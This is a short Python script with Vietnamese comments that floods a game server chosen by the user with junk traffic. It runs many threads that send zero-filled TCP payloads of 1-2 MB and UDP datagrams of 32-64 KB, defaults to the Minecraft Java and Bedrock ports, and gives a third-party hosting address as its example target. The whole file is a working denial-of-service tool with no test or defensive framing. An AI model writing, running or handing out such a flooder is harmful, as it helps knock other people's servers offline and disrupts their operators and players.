import socket
import threading
import random

# Hàm gửi gói tin TCP
def send_tcp_packet(server_ip, server_port, packet_count, thread_id):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((server_ip, server_port))
            for _ in range(packet_count):
                packet_size = random.randint(1024 * 1024, 2 * 1024 * 1024)  # 1MB - 2MB
                packet = b"\x00" * packet_size
                s.sendall(packet)
                print(f"🚀 [TCP] Luồng {thread_id}: Gửi {packet_size / (1024 * 1024):.2f} MB")
    except Exception as e:
        print(f"⚠️ [TCP] Lỗi ở luồng {thread_id}: {e}")

# Hàm gửi gói tin UDP (Giới hạn 32KB - 64KB)
def send_udp_packet(server_ip, server_port, packet_count, thread_id):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            for _ in range(packet_count):
                packet_size = random.randint(32 * 1024, 64 * 1024)  # 32KB - 64KB
                packet = b"\x00" * packet_size
                s.sendto(packet, (server_ip, server_port))
                print(f"🔥 [UDP] Luồng {thread_id}: Gửi {packet_size / 1024:.2f} KB")
    except Exception as e:
        print(f"⚠️ [UDP] Lỗi ở luồng {thread_id}: {e}")

# Nhập địa chỉ server
server_address = input("Nhập địa chỉ server (ví dụ: mbasic5.pikamc.vn:25083): ")

# Kiểm tra xem có nhập cổng không
if ":" in server_address:
    server_ip, server_port = server_address.split(":")
    server_port = int(server_port)
else:
    server_ip = server_address
    server_port = 25565  # Mặc định cho Minecraft Java

udp_port = 19132  # Mặc định cho Minecraft Bedrock

# Số luồng muốn sử dụng
thread_count = int(input("Nhập số lượng luồng: "))

# Số gói tin mỗi luồng gửi
tcp_packet_count = 10  # 10 gói TCP (1MB - 2MB mỗi gói)
udp_packet_count = 100  # 100 gói UDP (32KB - 64KB mỗi gói)

# Tạo & chạy nhiều luồng gửi TCP và UDP
threads = []
for i in range(thread_count):
    thread_tcp = threading.Thread(target=send_tcp_packet, args=(server_ip, server_port, tcp_packet_count, i+1))
    thread_udp = threading.Thread(target=send_udp_packet, args=(server_ip, udp_port, udp_packet_count, i+1))

    threads.append(thread_tcp)
    threads.append(thread_udp)

    thread_tcp.start()
    thread_udp.start()

# Đợi tất cả các luồng hoàn thành
for thread in threads:
    thread.join()

print("✅ Hoàn tất gửi gói tin TCP & UDP.")
